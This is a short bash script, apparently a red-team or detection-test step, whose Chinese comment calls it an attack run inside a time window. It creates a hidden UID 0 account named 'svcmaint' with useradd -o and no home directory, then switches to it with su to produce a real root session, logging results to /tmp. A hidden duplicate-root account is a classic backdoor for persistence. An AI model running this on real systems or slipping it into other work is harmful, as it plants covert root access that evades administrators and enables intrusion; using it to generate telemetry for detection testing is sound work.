#!/usr/bin/env bash
# attack（窗口内）：创建 UID 0 隐藏账号并 su 产生真实会话。
set -euo pipefail
useradd -o -u 0 -M -N -s /bin/bash svcmaint 2> /tmp/useradd-err.txt || echo "useradd rc=$?" >> /tmp/useradd-err.txt
su - svcmaint -c 'id' > /tmp/svcmaint-session.txt 2>&1 || true
